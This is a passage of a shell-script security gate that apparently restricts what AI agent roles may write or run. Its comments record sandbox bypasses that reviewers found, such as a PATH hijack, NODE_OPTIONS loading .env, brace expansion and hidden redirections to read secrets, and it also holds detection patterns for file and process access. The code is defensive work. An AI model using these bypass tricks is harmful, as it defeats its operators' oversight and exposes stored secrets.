    CAP_ID='process'; CAP_WHAT='a configuration key whose value is a command string (command:/cmd:) — a runtime that reads this file spawns that command through a shell, which no command group ever checked'
  fi
  # The extension gate opts .rb/.php/.lua/.ps1/.sh into this screen, and
  # until round 6 there were no patterns for any of them — so a role could
  # author a Ruby one-liner that read anything. These are the file and
  # process primitives of each language. Like every enumeration here it is
  # a floor, not a boundary; the boundary is `harness-os run`.
  if [ -z "$CAP_ID" ]; then
    if printf '%s' "$CODE_N" | grep -Eq '\b(File|IO)\.(read|write|open|binread|binwrite|readlines|foreach)\b|\bDir\.(glob|entries|children)\b|\bFileUtils\b'; then
      CAP_ID='fs'; CAP_WHAT='Ruby filesystem access (File/IO/Dir/FileUtils) — code that can read or write any path, ignoring the role scopes'
    elif printf '%s' "$CODE_N" | grep -Eq '\b(file_get_contents|file_put_contents|fopen|readfile|fread|fwrite|scandir|glob)[[:space:]]*\('; then
      CAP_ID='fs'; CAP_WHAT='PHP filesystem access (file_get_contents / fopen / readfile …) — code that can read or write any path, ignoring the role scopes'
    elif printf '%s' "$CODE_N" | grep -Eq '\bio\.(open|lines|input|output)[[:space:]]*\(|\bloadfile[[:space:]]*\(|\bdofile[[:space:]]*\('; then
      CAP_ID='fs'; CAP_WHAT='Lua filesystem access (io.open / io.lines / loadfile) — code that can read or write any path, ignoring the role scopes'
    elif printf '%s' "$CODE_N" | grep -Eq '\bGet-Content\b|\bSet-Content\b|\bOut-File\b|\bAdd-Content\b|\[IO\.File\]|\[System\.IO\.File\]'; then
      CAP_ID='fs'; CAP_WHAT='PowerShell filesystem access (Get-Content / Set-Content / [IO.File]) — code that can read or write any path, ignoring the role scopes'
    elif printf '%s' "$CODE_N" | grep -Eq '\b(codecs|fileinput|tempfile|pathlib)\.(open|input|Path|NamedTemporaryFile)|__builtins__(\.|\[)|\bgetattr[[:space:]]*\([[:space:]]*__'; then
      CAP_ID='fs'; CAP_WHAT='Python filesystem access reached indirectly (codecs / fileinput / __builtins__) — code that can read or write any path, ignoring the role scopes'
    elif printf '%s' "$CODE_N" | grep -Eq '\b(system|exec|popen|backticks|Open3)[[:space:]]*\(|`[^`]*`|\bshell_exec[[:space:]]*\(|\bproc_open[[:space:]]*\(|\bos\.execute[[:space:]]*\(|\bStart-Process\b|\bInvoke-Expression\b'; then
      CAP_ID='process'; CAP_WHAT='process spawning in a non-JS language (system / exec / backticks / Invoke-Expression) — code that runs commands no command group checked'
    fi
  fi
  # Playwright's own file-attachment API reads a path the kernel never
  # sees, and the composer has it in scope by definition.
  # ...but only when a PATH is actually named. `attach("shot", { body:
  # await page.screenshot() })` reads nothing, and `setInputFiles` with a
  # fixture inside the read scope is the only way to test a file upload.
  # Flagging the API rather than the path made both impossible.
  # ...and only when the path it names is OUTSIDE the read scope. A spec
  # in tests/e2e/ referencing a fixture in a sibling tests/fixtures/ must
  # write `../fixtures/cv.pdf`, and that resolves squarely inside a
  # `tests/**` read scope — denying on a leading `../` refused the safe
  # idiom while allowing the genuinely unscoped variable form. So the
  # literal is resolved against the FILE's own directory and held to the
  # role's read scope, which is what the rule always meant.
  #
  # INVERTED, after round 20. The screen used to extract a quoted string
  # from the call and check that; a call whose path was a VARIABLE
  # presented no string, so nothing was extracted and nothing objected:
  #
  #     const p = "../../.env";
  #     await page.locator("#f").setInputFiles(p);
  #
  # read the file at runtime and handed its bytes back through the page.
  # The concatenation spelling had been closed by folding; the variable
  # binding had not, and the operand of a call is an arbitrary
  # expression, so no amount of folding reaches it.
  #
  # This kernel had already made that argument twice — for authored
  # module names, and for awk/sed programs — and each time the answer was
  # to stop reading the operand and start requiring it to be provably
  # safe. Here that means: a file-opening framework call must carry a
  # LITERAL path that resolves inside the read scope. Anything else, of
  # any shape, is refused, because a path built at run time cannot be
  # scoped at author time.
  #
  # The method list is widened at the same time. `setInputFiles` reaches
  # the filesystem through wrappers — element-interactions' own
  # `uploadFile` calls it internally — and a role granted that package is
  # expected to use them. A wrapper the kernel does not know is treated
  # like any other unverifiable call.
  if [ -z "$CAP_ID" ]; then
    local fw_call fw_arg fw_lit fw_abs fw_rel fw_dir fw_scope
    fw_dir=$(dirname "$(harness_os_normalize_path "$target")")
    fw_scope=$(harness_os_role_field "$ROLE" ".read.allow")
    while IFS= read -r fw_call; do
      [ -n "$fw_call" ] || continue
      # The argument text: for attach({path: X}) the value after `path:`,
      # otherwise everything inside the parens. Spaces around the colon
      # are normalised away FIRST — a `case` pattern is a glob, where
      # `[[:space:]]*` means one space then anything rather than zero or
      # more spaces, so `path: s` did not match and the option name was
      # read as the path.
      local fw_norm
      fw_norm=$(printf '%s' "$fw_call" | sed -E 's/[[:space:]]*:[[:space:]]*/:/g')
      # `attach` names a file ONLY through its `path:` property —
      # `attach("shot", { body: await page.screenshot() })` opens
      # nothing, and reading its last argument as a path refused the
      # commonest attachment in any Playwright suite.
      case "$fw_norm" in
        .attach*|.attachFile*)
          case "$fw_norm" in *[Pp]ath:*) : ;; *) continue ;; esac ;;
      esac
      case "$fw_norm" in
        *[Pp]ath:*)
          # attach(name, { path: X }) — the value after `path:`. Spaces
          # around the colon are normalised away first, because a `case`
          # pattern is a glob where `[[:space:]]*` means one space then
          # anything, not zero-or-more spaces.
          fw_arg="${fw_norm#*[Pp]ath:}"
          fw_arg=$(printf '%s' "$fw_arg" | sed -E 's/[,)}].*$//') ;;
        *)
          # setInputFiles and the upload wrappers take the path LAST:
          # `setInputFiles(path)` from a locator, `setInputFiles(sel,
          # path)` from the page, `uploadFile(a, b, path)` from the
          # package. Taking the FIRST argument read the SELECTOR as the
          # path, and a selector like "#f" resolves inside tests/** —
          # so an out-of-scope path in the second argument was waved
          # through by the very check that had caught it for two rounds.
          fw_arg="${fw_norm#*(}"
          fw_arg=$(printf '%s' "$fw_arg" | sed -E 's/\)[^)]*$//')
          # An ARRAY names several files and the framework reads every
          # one of them. Reducing the operand to its last comma-separated
          # token — which is what "the path comes last" meant when only
          # one path was in view — checked the final element and left the
          # rest structurally invisible, so putting the secret anywhere
          # but last walked straight through. Every element is a path,
          # so every element is checked.
          case "$fw_arg" in
            *\[*\]*) fw_arg="${fw_arg#*\[}"; fw_arg="${fw_arg%%\]*}" ;;
            *,*)       fw_arg="${fw_arg##*,}" ;;
          esac ;;
      esac
      # One candidate per comma. A single path yields one; an array
      # yields all of them, and a call is only safe when EVERY path it
      # names is.
      local fw_cand fw_bad=0
      while IFS= read -r fw_cand; do
        [ -n "$fw_cand" ] || continue
        # Trim AFTER splitting: splitting exposes whitespace that was
        # interior a moment ago, and a trailing space made
        # `"../fixtures/cv.pdf" ` fail the literal test and refused an
        # ordinary fixture reference.
        fw_arg=$(printf '%s' "$fw_cand" | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//')
        [ -n "$fw_arg" ] || continue
      # A literal is a single quoted string and nothing else. Anything
      # further — a variable, a template, a member expression, a call —
      # is a path this kernel cannot resolve.
      case "$fw_arg" in
        \"*\") fw_lit="${fw_arg%\"}"; fw_lit="${fw_lit#\"}"; case "$fw_lit" in *\"*) fw_lit="" ;; esac ;;
        \'*\') fw_lit="${fw_arg%\'}"; fw_lit="${fw_lit#\'}"; case "$fw_lit" in *\'*) fw_lit="" ;; esac ;;
        *) fw_lit="" ;;
      esac
      # Being quoted is not the same as being static. A string carrying
      # an interpolation — `${…}` in a template, or the same text in a
      # double-quoted string that some other layer produced — names a
      # path that does not exist until run time, and resolving it here
      # produces a confident answer about a directory literally called
      # `${d}`. Found while chasing why a template-literal probe passed:
      # the backticks had been flattened to quotes before the kernel saw
      # them, and the quoted form sailed through as a resolvable literal.
      case "$fw_lit" in *'${'*|*'`'*) fw_lit="" ;; esac
        if [ -z "$fw_lit" ]; then
          CAP_ID='fs'; CAP_WHAT="a test-framework file API whose path is built at run time ('$fw_arg'), which no scope check can resolve — the framework opens it directly, with no host module for a check to see"
          fw_bad=1; break
        fi
        case "$fw_lit" in *://*) continue ;; esac
        case "$fw_lit" in /*) fw_abs="$fw_lit" ;; *) fw_abs="$fw_dir/$fw_lit" ;; esac
        fw_rel=$(harness_os_relpath "$fw_abs")
        if [ "$fw_scope" != "null" ] && harness_os_path_in_scope "$fw_rel" "$fw_scope"; then continue; fi
        CAP_ID='fs'; CAP_WHAT="a test-framework file API naming '$fw_rel', which is outside this role's read scope — the framework opens it directly, with no host module for a scope check to see"
        fw_bad=1; break
      done <<< "$(printf '%s' "$fw_arg" | tr ',' '\n')"
      [ "$fw_bad" = "1" ] && break
    done < <(printf '%s' "$CODE_N" \
      | grep -oE "\.(attach|setInputFiles|uploadFile|uploadFiles|attachFile|setFiles)[[:space:]]*\([^)]*\)?" 2>/dev/null)
  fi
  # An IMPORT ALLOWLIST, when the role declares one. Round 6 made the
  # argument that killed the previous design: the capability branches
  # above recognise dangerous BUILTINS, but `require("dotenv").config()`
  # reads .env with a plain literal specifier and a package name no list
  # can enumerate — nor can `glob`, `fs-extra`, `shelljs`, or the next
  # one published. The set of packages that touch the filesystem is open.
  #
  # So the same inversion that fixed the builtin check applies here: a
  # role may declare exactly which non-relative modules its authored code
  # imports, and anything else is refused. Test code has a small, knowable
  # import surface, which is what makes the allowlist practical.
  #
  # Absent, package imports pass — declaring it is opt-in, because
  # denying `@playwright/test` by default would break every existing
  # manifest. `validate` warns for any role that authors code and can run
  # it without either this list or the `harness-os run` wrapper, and the
  # architecture doc is explicit that the screen is advisory until one of
  # those is in place.
  local IMPORTS_ALLOW
  IMPORTS_ALLOW=$(harness_os_role_field "$ROLE" '.write.codeImports')
  # AN ABSENT DECLARATION WAS THE PERMISSIVE STATE, which is the shape
  # round 37 inverted on the environment screen and nobody carried here.
  #
  #   codeImports absent  ->  import "dotenv/config"   ALLOW
  #   codeImports: []     ->  import "dotenv/config"   DENY
  #
  # A role that authors code and runs it, and declares neither list, was
  # contained only by the capability screen — which reads authored text
  # for a fixed set of stdlib names and cannot see what a third-party
  # package does inside itself. `dotenv/config` reads .env; `execa`
  # spawns; neither names anything the screen scans for. Round 43
  # demonstrated both.
  #
  # A security kernel's UNCONFIGURED state for a capable role must be its
  # most restrictive, not its least. So for a role that both authors
  # executable files and can run commands — the write-then-execute shape,
  # and the only one where this matters — a missing list reads as an
  # EMPTY list. The operator then declares what the role's code imports,
  # which is the declaration the axis was always asking for.
  #
  # A role that authors but cannot run is unchanged: something else runs
  # its output, and holding it to an allowlist it never declared would be
  # a deny an operator cannot act on from a manifest they may not own.
  if [ "$IMPORTS_ALLOW" = "null" ] \
     && [ "$(harness_os_role_field "$ROLE" '.write.allow')" != "null" ] \
     && [ "$(harness_os_role_field "$ROLE" '.bash')" != "null" ]; then
    IMPORTS_ALLOW='[]'
  fi
  if [ -z "$CAP_ID" ] && [ "$IMPORTS_ALLOW" != "null" ]; then
    local spec CODE_IMP
    # One more view, and it is what lets both directions be right at once.
    # A string literal is emptied UNLESS it sits directly after `from`,
    # `require(` or `import(` — i.e. unless it is a specifier. So the
    # fixture `const msg = "to fix, import Button from \"@mui/material\""`
    # becomes `const msg = ""` and names nothing, while
    # `import {config} from "dotenv"` keeps the one string that matters.
    # Without this, splitting statements to find Prettier-wrapped imports
    # also found the imports written inside prose.
    CODE_IMP=$(printf '%s' "$CODE_N" | perl -0777 -pe '
        s{("(?:\\.|[^"\\])*")}{ my $s = $1; ($` =~ /(?:\bfrom|\brequire\s*\(|\bimport\s*\(|\bimport)\s*$/s) ? $s : q{""} }ge
      ' 2>/dev/null || printf '%s' "$CODE_N")
    [ -n "$CODE_IMP" ] || CODE_IMP="$CODE_N"
    while IFS= read -r spec; do
      [ -n "$spec" ] || continue
      case "$spec" in '') continue ;; esac
      # A relative or absolute specifier is not a package, so the
      # allowlist has nothing to say about it — but it is still a READ,
      # and this branch used to `continue` outright. The deny message
      # two dozen lines below has always offered "a relative import
      # inside your write scope" as the safe alternative; nothing
      # enforced the "inside". `import d from "../../.env"` was ALLOW,
      # and so was pulling any importable file in the repo into the
      # executed test context. Round 25 found the gap by reading the
      # code's own promise back to it.
      #
      # So a relative specifier is resolved against the FILE's directory
      # and held to the same scope as any other read — the identical
      # rule the framework-file-API branch above already applies, for the
      # identical reason: the runtime opens the path directly, with no
      # host module for a scope check to see. Only candidates that
      # actually EXIST can deny, which is what keeps a specifier that
      # resolves to nothing from costing anything.
      case "$spec" in
        ./*|../*|/*)
          local imp_dir imp_abs imp_rel imp_scope imp_wscope imp_ext imp_cand
          imp_dir=$(dirname "$(harness_os_normalize_path "$target")")
          imp_scope=$(harness_os_role_field "$ROLE" '.read.allow')
          imp_wscope=$(harness_os_role_field "$ROLE" '.write.allow')
          [ "$imp_scope" = "null" ] && continue
          case "$spec" in /*) imp_abs="$spec" ;; *) imp_abs="$imp_dir/$spec" ;; esac
          imp_abs=$(harness_os_normalize_path "$imp_abs")
          for imp_ext in "" .ts .tsx .mts .cts .js .jsx .mjs .cjs .json .node /index.ts /index.js /index.mjs; do
            imp_cand="${imp_abs}${imp_ext}"
            [ -f "$imp_cand" ] || continue
            imp_rel=$(harness_os_relpath "$imp_cand")
            harness_os_path_in_scope "$imp_rel" "$imp_scope" && continue
            if [ "$imp_wscope" != "null" ] && harness_os_path_in_scope "$imp_rel" "$imp_wscope"; then continue; fi
            harness_os_deny "write-code-import-scope:$imp_rel $rel" "[BLOCKED] Role '${ROLE}' may not author code importing '$spec' — it resolves to '$imp_rel', which is outside this role's read scope.

${ROLE_HEADER}
File: $rel${via}
read scope: $(printf '%s' "$imp_scope" | "$JQ" -r 'join(", ")' 2>/dev/null)

A relative import is exempt from the package allowlist because it names no package — but it is still a read, and the runtime opens it directly with no host module for a scope check to see. It is held to the same scope as naming the file any other way.

Import only paths inside this role's read scope."
          done
          continue ;;
      esac
      if ! printf '%s' "$IMPORTS_ALLOW" | "$JQ" -e --arg m "$spec" 'index($m) != null' >/dev/null 2>&1; then
        harness_os_deny "write-code-import:$spec $rel" "[BLOCKED] Role '${ROLE}' may not author code importing '$spec' — it is not in this role's declared import list.

${ROLE_HEADER}
File: $rel${via}
declared imports: $(printf '%s' "$IMPORTS_ALLOW" | "$JQ" -r 'join(", ")' 2>/dev/null)

A package name is an open set: 'dotenv' reads .env, 'glob' and 'fs-extra' wrap the filesystem, and no list of dangerous names can be finished. So this role declares what its code DOES import, and everything else is refused — the same inversion that made the builtin-module check sound.

Options, narrowest first:
  1. Use a module already declared, or a relative import inside your write scope.
  2. If this role's work genuinely needs it, the operator can add it:
       \"write\": { \"codeImports\": [\"$spec\"] }
     Every other package stays denied.

Preview before committing: harness-os explain --role ${ROLE} --tool Write --path <file> --content '<code>'"
      fi
    # `from "x"` is only an import when a STATEMENT said so — matching it
    # anywhere denied a spec for a package name inside a string literal.
    # But anchoring that statement to the start of a LINE was wrong in
    # the other direction, and it was a regression: Prettier's default
    # formatting puts the specifier on a different line from its `import`
    # keyword, and on the Bash authoring channel the statement never
    # starts a line at all. Round 6 caught both; anchoring lost them.
    #
    # So statements are re-derived instead of assumed: the text is
    # normalised to one line, then split BEFORE every `import`/`export`/
    # `require` keyword, so each fragment begins with the keyword that
    # owns the specifier wherever a formatter put it. `import type` is
    # erased at compile time — it imports nothing at run time — so it is
    # dropped rather than held to a runtime list.
    done < <(printf '%s' "$CODE_IMP" | tr '\n' ' ' | tr ';' '\n' \
      | sed -E 's/([^A-Za-z0-9_$])(import|export|require)([^A-Za-z0-9_$])/\1\n\2\3/g' \
      | grep -vE '^[[:space:]]*(import|export)[[:space:]]+type[[:space:]]' \
      | grep -oE '(^|[^A-Za-z0-9_$])(require|import)[[:space:]]*\([[:space:]]*"[^"]+"|^[[:space:]]*(import|export)[^";]*from[[:space:]]*"[^"]+"|^[[:space:]]*import[[:space:]]*"[^"]+"' 2>/dev/null \
      | sed -E 's/.*"([^"]+)".*/\1/' \
      | sed -E '/^[.\/]/b; s|^(@[^/]+/[^/]+).*|\1|; t; s|^([^/]+)/.*|\1|' | sort -u)
  fi

  [ -n "$CAP_ID" ] || return 0
  if [ "$CAPS_ALLOW" != "null" ] && printf '%s' "$CAPS_ALLOW" | "$JQ" -e --arg c "$CAP_ID" 'index($c) != null' >/dev/null 2>&1; then
    return 0
  fi
  harness_os_deny "write-code-capability:${CAP_ID} $rel" "[BLOCKED] Role '${ROLE}' may not author code using ${CAP_WHAT}.

${ROLE_HEADER}
File: $rel${via}

Why this is gated: code you write is code something will RUN — your own test command, CI, or another role. At that moment the code holds ITS permissions, not yours, so an unrestricted \`${CAP_ID}\` capability inside a file you author silently voids every read/write scope on this role. Path scopes only bind if the code inside the path stays inside them.

Options, narrowest first:
  1. Use the framework's own API instead of reaching for the host — a
     test should drive the app through its fixtures, not the filesystem.
  2. If this file genuinely needs it, the operator can grant exactly
     that capability to this role:
       \"write\": { \"codeCapabilities\": [\"${CAP_ID}\"] }
     Other capabilities stay denied, and every path scope still applies.

Preview before committing: harness-os explain --role ${ROLE} --tool Write --path <file>"
}

# --- Axis 3: bash command gate ------------------------------------------
# Bash is the widest laundering channel a role has, so this axis carries
# most of the leak-proofing: quote-blind segmentation over EVERY command
# separator, a built-in deny list for indirection constructs no allow
# pattern can safely coexist with, write-target checks on redirections,
# and a read-scope check over every token that resolves to a real file.
# Everywhere the axis guesses, it guesses toward deny-with-guidance.

# screen_env_assignments <segment>
# Refuses a leading NAME=value whose NAME is read as OPTIONS by the
# runtime the segment starts.
#
# The assignment strip is the only place in this kernel where text is
# removed from a segment before EVERY axis runs, rather than being
# neutralised for one specific check. The assumption underneath it —
# that `NAME=value` is data for the command — is false for names that
# are argv for the process, or that decide which PROGRAM a command word
# runs at all.
#
# INVERTED, after round 37, and the inversion is the whole point.
#
# This screen was a DENYLIST of names known to be dangerous. Round 23
# built it from `NODE_OPTIONS`; round 37 broke it with the most common
# environment variable there is:
#
#     PATH=/tmp/evil:/usr/bin:/bin grep -rn foo tests/
#
# `PATH` was not on the list, so the assignment passed the screen, was
# stripped as data, and `grep -rn foo tests/` matched a permitted
# pattern with an in-scope operand. At exec time the shell resolved
# `grep` through the injected directory. The reviewer put a binary there
# and printed all three planted secrets. One line dissolved the command
# group, the read scope, the write scope and the network scope at once,
# for any role holding Bash and one non-builtin command.
#
# Round 36 had already stated why in the abstract: an allowlist of
# dangerous things fails open on the unknown, an exemption list of safe
# things fails closed. This is that lesson applied to the arm that
# guards the one place text is deleted — and `PATH` is the standing
# proof that the dangerous names can never be enumerated, because the
# most ordinary variable in existence is one of them.
#
# So a leading assignment is refused unless its NAME is provably inert:
# on the built-in list of variables that are data for an application and
# never resolution, loader or option config, or on the role's own
# `bash.env` list, which is how an operator says "this one, deliberately".
#
# ONE COPY, called from both strips. There are two — the leading strip
# and the one inside the wrapper loop — and round 3 already had to fix
# the same defect twice because of it. A rule duplicated per site is a
# rule that will be applied at one site.
screen_env_assignments() {
  local sa_seg="$1" sa_list sa_a sa_name sa_why
  sa_list=$(printf '%s' "$sa_seg" | sed -E 's/^[[:space:]({]+//' \
    | grep -oE '^([A-Za-z_][A-Za-z0-9_]*=[^[:space:]<>|&]*[[:space:]]+)+' 2>/dev/null || true)
  [ -n "$sa_list" ] || return 0
  for sa_a in $sa_list; do
    sa_name="${sa_a%%=*}"
    # Provably inert: the value is data an APPLICATION reads. Nothing
    # here changes which program runs, which module loads, which host is
    # dialled, or how the shell behaves.
    case "$sa_name" in
      CI|NODE_ENV|APP_ENV|RAILS_ENV|ENVIRONMENT|STAGE|\
      TZ|LANG|LANGUAGE|LC_ALL|LC_CTYPE|LC_NUMERIC|LC_TIME|LC_COLLATE|LC_MONETARY|LC_MESSAGES|\
      TERM|COLUMNS|LINES|FORCE_COLOR|NO_COLOR|CLICOLOR|CLICOLOR_FORCE|\
      DEBUG|LOG_LEVEL|LOGLEVEL|VERBOSE|QUIET|SILENT|\
      HEADLESS|HEADED|SLOWMO|WORKERS|RETRIES|SHARD|TEST_ENV|TEST_TIMEOUT|\
      JEST_WORKER_ID|VITEST_POOL_ID|PWTEST_SKIP_TEST_OUTPUT)
        continue ;;
    esac
    # ...or the operator named it for this role.
    if [ "$BASH_ENV_ALLOW" != "null" ] \
       && printf '%s' "$BASH_ENV_ALLOW" | "$JQ" -e --arg n "$sa_name" 'index($n) != null' >/dev/null 2>&1; then
      continue
    fi
    # ...or the role opted into environment injection wholesale.
    if [ "$BASH_PERMIT" != "null" ] \
       && printf '%s' "$BASH_PERMIT" | "$JQ" -e 'index("env-injection") != null' >/dev/null 2>&1; then
      continue
    fi
    case "$sa_name" in
      PATH) sa_why="'PATH' decides which FILE a command word runs. Setting it in front of a permitted command means the kernel checks the name \`grep\` while the shell executes something else entirely — every axis in this manifest is written against argv, and this rebinds what argv means." ;;
      NODE_OPTIONS|PERL5OPT|RUBYOPT|PYTHONSTARTUP|BASH_ENV|ENV|LD_PRELOAD|JAVA_TOOL_OPTIONS|_JAVA_OPTIONS)
        sa_why="'$sa_name' is read as OPTIONS by the runtime it starts, so it loads code the kernel's checks never see — \`NODE_OPTIONS=--require=<file>\` turns any permitted node command into a loader for that file, and it cancels the runtime profile \`harness-os run\` exists to install." ;;
      *_PROXY|*_proxy|CURL_HOME|npm_config_*)
        sa_why="'$sa_name' redirects where a client connects, which is the network scope's job and not this variable's." ;;
      GIT_*) sa_why="'$sa_name' changes what git does — the config it reads, the pager or diff tool it spawns, the transport it uses — none of which is visible in the command." ;;
      *) sa_why="The kernel cannot show that '$sa_name' is data rather than configuration for the program, the loader, the shell or the network, so it is refused rather than deleted." ;;
    esac
    set +f
    harness_os_deny "bash-env-assignment $sa_name" "[BLOCKED] Role '${ROLE}' set '$sa_name' in front of a command, and the kernel cannot treat that as data.

${ROLE_HEADER}

Command: ${CMD}

$sa_why

A leading NAME=value is normally data for the command, and the kernel strips it before every other check — which is why the name has to be one it can show is inert. That list used to name the DANGEROUS variables and let everything else through; \`PATH\` is not an exotic name, and it was not on it.

Options, narrowest first:
  1. Run the command without the assignment.
  2. If this role genuinely needs the variable, the operator can name it:
       \"bash\": { \"env\": [\"$sa_name\"] }
     Every other name stays refused.
  3. bash.permit: [\"env-injection\"] waives the screen entirely — for a
     deliberately trusted role, never to silence a single deny."
  done
}

if [ "$HOS_TOOL" = "Bash" ]; then
  CMD=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.command // empty' 2>/dev/null || echo "")
  BASH_SPEC=$(harness_os_role_field "$ROLE" '.bash')
  BASH_UNRESTRICTED=$(printf '%s' "$HOS_MANIFEST_JSON" | "$JQ" -r --arg r "$ROLE" '.roles[$r].bash.unrestricted // false' 2>/dev/null || echo "false")
  # Named indirection constructs this role may use despite the built-in
  # denies (see axis 3a). Granular by design: permitting one construct
  # never waives the others.
  BASH_PERMIT=$(harness_os_role_field "$ROLE" '.bash.permit')
  # Environment variable names this role may set in front of a command.
  # The screen above refuses everything it cannot show to be inert, so
  # this is how an operator says "this one, deliberately".
  BASH_ENV_ALLOW=$(harness_os_role_field "$ROLE" '.bash.env')

  WRITE_ALLOW=$(harness_os_role_field "$ROLE" '.write.allow')
  WRITE_DENY=$(harness_os_role_field "$ROLE" '.write.deny')
  READ_ALLOW=$(harness_os_role_field "$ROLE" '.read.allow')
  READ_DENY=$(harness_os_role_field "$ROLE" '.read.deny')
  HAS_WRITE_GRANTS=0
  if [ "$WRITE_ALLOW" != "null" ] && [ "$(printf '%s' "$WRITE_ALLOW" | "$JQ" -r 'length' 2>/dev/null || echo 0)" != "0" ]; then
    HAS_WRITE_GRANTS=1
  fi

  ALLOW_PATTERNS=""
  DENY_PATTERNS=""
  if [ "$BASH_SPEC" != "null" ]; then
    # Effective allow set = expansion of named commandGroups + inline allow.
    ALLOW_PATTERNS=$(printf '%s' "$HOS_MANIFEST_JSON" | "$JQ" -r --arg r "$ROLE" '
      [ ((.roles[$r].bash.groups // [])[] as $g | (.commandGroups[$g] // [])[]),
        ((.roles[$r].bash.allow // [])[]) ] | .[]' 2>/dev/null || echo "")
    DENY_PATTERNS=$(printf '%s' "$HOS_MANIFEST_JSON" | "$JQ" -r --arg r "$ROLE" '(.roles[$r].bash.deny // [])[]' 2>/dev/null || echo "")

    if [ -z "$ALLOW_PATTERNS" ] && [ "$BASH_UNRESTRICTED" != "true" ]; then
      harness_os_deny "bash-no-allow" "[BLOCKED] Role '${ROLE}' declares a bash section but its command groups expand to zero allow patterns (a named group may be missing from commandGroups).

${ROLE_HEADER}

Fix the manifest in an operator design session — until then this role can run no Bash commands."
    fi
  fi

  # Mask fd-plumbing (2>&1, >/dev/null, …) BEFORE segmentation so a
  # lone '&' separator can be split on without shredding '2>&1', and so
  # redirect analysis below only ever sees real file targets.
  CLEAN=$(printf '%s' "$CMD" | sed -E 's/[0-9]*>&[0-9-]+//g; s/[0-9&]*>>?[[:space:]]*\/dev\/(null|stderr|stdout|tty)//g')

  # Split on every command separator — newline (multi-line commands
  # arrive verbatim), && || ; | and the single '&' (background). Then
  # strip leading env-var assignments and grouping punctuation and
  # require EVERY non-empty segment to clear every check below.
  #
  # The split is quote-AWARE. It used to be quote-blind on the reasoning
  # that over-splitting can only cause a deny, never an allow — safe in
  # the direction that matters. It is safe, and it was also unusable:
  # `echo "await steps.click('x');" >> spec.ts` splits mid-string and the
  # fragment `" >> spec.ts` matches no command pattern, so writing most
  # lines of JavaScript through Bash was refused with a message about
  # command patterns. A separator inside quotes is not a separator — the
  # shell does not treat it as one — so neither does this. Placeholders
  # carry the quoted separators through the split and are restored after,
  # leaving each segment byte-identical to what the shell will run.
  # An unterminated quote makes every check below read the tail of the
  # command as inert string. bash refuses such a command outright, so
  # refusing it here costs nothing and removes the need to rely on that.
  if ! printf '%s' "$CMD" | harness_os_quotes_balanced; then
    harness_os_deny "bash-unbalanced-quotes" "[BLOCKED] Role '${ROLE}' sent a command with an unterminated quote, which cannot be checked.

${ROLE_HEADER}

Command: ${CMD}

Everything after an unclosed quote reads as string rather than syntax, so the kernel cannot tell which parts are commands and which are text. A shell would refuse this command too. Close the quote and send it again."
  fi

  SEGMENTS=$(printf '%s' "$CLEAN" | harness_os_unquoted_view split \
    | sed -e 's/&&/\n/g' -e 's/||/\n/g' -e 's/;/\n/g' -e 's/|/\n/g' -e 's/&/\n/g')
  while IFS= read -r seg; do
    # Keep the untouched segment: the normalisation below strips trailing
    # grouping punctuation, which would silently REMOVE the closing brace
    # of a `{a,b}` expansion and hide it from both the brace-expansion
    # deny and the read-token scan. A reviewer read .env through exactly
    # that gap with `cat {.env,x}`, so every check that could be fooled
    # by the strip consults SEG_RAW instead.
    # Restore the separators that were placeheld through the split, so
    # every check below sees the segment exactly as the shell will.
    seg=$(printf '%s' "$seg" | harness_os_unsplit)
    SEG_RAW="$seg"
    # SCREEN the leading assignments before dropping them. This strip is
    # the only place in the kernel where text is removed from a segment
    # before EVERY axis runs rather than being neutralised for one check,
    # and the assumption underneath it — that `NAME=value` is data for
    # the command — is false for a specific, small set of names. They are
    # argv for the process the segment starts:
    #
    #   NODE_OPTIONS=--require=./.env npx playwright test
    #
    # is a permitted command, and node prints the file while failing to
    # parse it. No authored file, no second step, and it worked against
    # the benchmark's real manifest with the composer's real grants.
    # `PERL5OPT`, `RUBYOPT`, `BASH_ENV`, `PYTHONSTARTUP` and `LD_PRELOAD`
    # are the same shape for their runtimes.
    #
    # These are refused rather than scope-checked because their VALUE is
    # an option string, not a path — `--require=x` is not a filename and
    # resolving it as one would be the literal-matching mistake rounds 16
    # and 20 both had to undo. A role that genuinely needs one opts in
    # through bash.permit, like every other indirection construct.
    screen_env_assignments "$seg"
    seg=$(printf '%s' "$seg" | sed -E 's/^[[:space:]({]+//; s/[[:space:])}]+$//; s/^([A-Za-z_][A-Za-z0-9_]*=[^[:space:]<>|&]*[[:space:]]+)*//')
    [ -n "$seg" ] || continue

    # Quote-aware views of the segment. Quoting does not change which word
    # is the command — `"cat" x` still runs cat — so the command-name and
    # allow-set checks keep reading the segment verbatim. It DOES decide
    # whether a construct is syntax or text, and the expansion checks below
    # would otherwise fire on `echo '{"a":1,"b":2}'` and stay silent on
    # nothing at all. SEG_NOQ blanks every quoted run (what the shell still
    # globs / brace-expands); SEG_NOSQ blanks only single-quoted runs,
    # because $… and `…` keep expanding inside double quotes.
    SEG_NOQ=$(printf '%s\n' "$SEG_RAW" | harness_os_unquoted_view both)
    SEG_NOSQ=$(printf '%s\n' "$seg" | harness_os_unquoted_view single)
    # Redirection is read from the UN-STRIPPED segment, quote-masked.
    # Both halves of that matter, and each was a real escape:
    #   * un-stripped, because the assignment and wrapper strips above
    #     consume a `NAME=value` run — and `env X=1<.env cat` hides a
    #     whole redirection inside one. A reviewer used that to read a
    #     secret, write outside every scope, and overwrite the kernel
    #     itself, from a role with no write grants at all.
    #   * quote-masked, because `grep '=>' spec.ts` is not a redirection,
    #     and denying it (or `grep '<input>' page.json`) is the kind of
    #     nonsense that gets a gate switched off.
    SEG_REDIR=$(printf '%s\n' "$SEG_RAW" | harness_os_unquoted_view redir)

    # Strip leading command-runner / wrapper prefixes so the checks below
    # see the REAL command. `env sh -c …`, `timeout 5 python -c …`,
    # `sudo bash …`, `nohup nice cat .env` would otherwise hide a shell,
    # an interpreter, or a file access behind a wrapper whose own name
    # matches an allow pattern. Each iteration removes one wrapper word
    # plus its obvious options / numeric or KEY=VAL args; the loop stops
    # at the first non-wrapper head. Both the wrapper-stripped view (for
    # builtin + allow + read checks) and the original segment (already
    # checked for redirects above) are covered.
    WRAP_RE='^(env|sudo|doas|nohup|setsid|nice|ionice|chrt|stdbuf|time|timeout|command|builtin|exec|then|else|do|watch|unbuffer)([[:space:]]|$)'
    STRIP_GUARD=0
    while printf '%s' "$seg" | grep -Eq "$WRAP_RE"; do
      STRIP_GUARD=$((STRIP_GUARD + 1)); [ "$STRIP_GUARD" -gt 20 ] && break
